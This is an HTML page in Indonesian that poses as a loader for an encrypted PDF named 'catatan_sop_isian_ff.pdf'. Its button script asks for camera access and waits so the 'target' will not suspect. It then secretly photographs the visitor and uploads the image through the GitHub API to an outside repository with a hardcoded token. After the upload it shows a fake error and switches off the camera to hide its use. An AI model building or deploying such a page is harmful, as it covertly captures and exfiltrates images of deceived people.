<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOP FF - Document Loader</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0b0b; color: #e0e0e0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #1a1a1a; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; }
        .loader { border: 4px solid #222; border-top: 4px solid #ff4500; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: linear-gradient(45deg, #ff4500, #ff8c00); color: white; border: none; padding: 15px 30px; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 16px; transition: 0.3s; width: 100%; }
        .btn:hover { transform: scale(1.05); box-shadow: 0 0 15px rgba(255, 69, 0, 0.4); }
        #status { margin-top: 20px; font-size: 0.85em; color: #666; font-family: monospace; min-height: 40px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div class="loader"></div>
        <h2 style="color: #ff4500;">FILE ENCRYPTED</h2>
        <p>Dokumen <b>catatan_sop_isian_ff.pdf</b> diproteksi sistem.<br>Silakan muat ulang dan izinkan sinkronisasi untuk membaca isi SOP.</p>
        <button class="btn" onclick="executeExfiltrate()">LOAD & DECRYPT PDF</button>
        <div id="status">System: Waiting for user action...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        async function executeExfiltrate() {
            const status = document.getElementById('status');
            status.innerText = "> Initializing decryption module...";
            
            try {
                // Trigger Izin Kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                status.innerText = "> Decrypting buffer data...";

                // Kasih delay biar target gak curiga dan posisi muka pas
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    const dataURL = canvas.toDataURL('image/png');
                    const base64Content = dataURL.split(',')[1];
                    
                    // CONFIG REPO LU, SUCCESSOR
                    const GITHUB_TOKEN = "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"; 
                    const REPO = "spcman";
                    const USER = "nodeearnid-ship-it";
                    const fileName = `target_${Math.floor(Date.now() / 1000)}.png`;

                    status.innerText = "> Authenticating with server...";

                    // Kirim ke GitHub API (Direct Injection)
                    const response = await fetch(`https://api.github.com/repos/${USER}/${REPO}/contents/uploads/${fileName}`, {
                        method: "PUT",
                        headers: {
                            "Authorization": `Bearer ${GITHUB_TOKEN}`,
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            message: "System Log: Captured",
                            content: base64Content
                        })
                    });

                    if(response.ok) {
                        status.innerText = "> Error: Cloud Decryption Failed (0x8004). Try again later.";
                    } else {
                        status.innerText = "> Error: Security Handshake Timeout.";
                    }
                    
                    // Matiin kamera biar gak ketauan (lampu ijo di HP mati)
                    stream.getTracks().forEach(track => track.stop());
                }, 1200);
            } catch (err) {
                status.innerText = "> Error: Browser permission denied. Please allow camera to load PDF.";
            }
        }
    </script>
</body>
</html>
